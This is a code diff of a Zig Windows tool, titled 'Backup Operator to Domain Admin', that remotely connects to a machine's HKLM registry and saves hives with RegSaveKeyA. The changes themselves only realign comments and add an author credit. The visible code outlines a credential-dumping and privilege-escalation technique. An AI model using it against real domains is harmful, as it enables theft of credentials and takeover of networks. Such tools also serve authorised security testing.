@@ -193,8 +193,8 @@ const Target = struct {
         std.log.debug("[+] Calling RegConnectRegistryA({s}, HKLM, hKey)", .{source});
         result = win32.RegConnectRegistryA(
             if (self.source.?.len > 0) source else @ptrFromInt(0), //    [in, optional] LPCSTR lpMachineName,
-            win32.HKEY_LOCAL_MACHINE, //                                 [in]           HKEY   hKey,
-            &local_machine, //                                           [out]          PHKEY  phkResult
+            win32.HKEY_LOCAL_MACHINE, //                                                                [in]           HKEY   hKey,
+            &local_machine, //                                                                          [out]          PHKEY  phkResult
         );
         if (result != win32.WIN32_ERROR.NO_ERROR) {
             if (@intFromEnum(result) == @intFromEnum(win32.RPC_STATUS.RPC_S_INVALID_NET_ADDR)) {
@@ -253,9 +253,9 @@ const Target = struct {
                 std.log.debug("[+] Calling RegSaveKeyA(hKey, {s}, null)", .{destination});
                 // https://learn.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsavekeya
                 result = win32.RegSaveKeyA(
-                    hive_key.?, //                          [in]           HKEY                        hKey,
+                    hive_key.?, //      [in]           HKEY                        hKey,
                     @as([*:0]const u8, destination), //     [in]           LPCSTR                      lpFile,
-                    @ptrFromInt(0), //                      [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes
+                    @ptrFromInt(0), //  [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes
                 );
                 if (result != win32.WIN32_ERROR.NO_ERROR) {
                     if (result == win32.WIN32_ERROR.ERROR_INVALID_PARAMETER) {
@@ -392,7 +392,7 @@ pub fn usage(argv: []u8) !void {
     const stdout = std.io.getStdOut().writer();
 
     try stdout.print(
-        \\Backup Operator to Domain Admin
+        \\Backup Operator to Domain Admin (by @ArchiMoebius)
         \\
         \\  This tool exist thanks to https://github.com/Wh04m1001 && https://github.com/mpgn
         \\
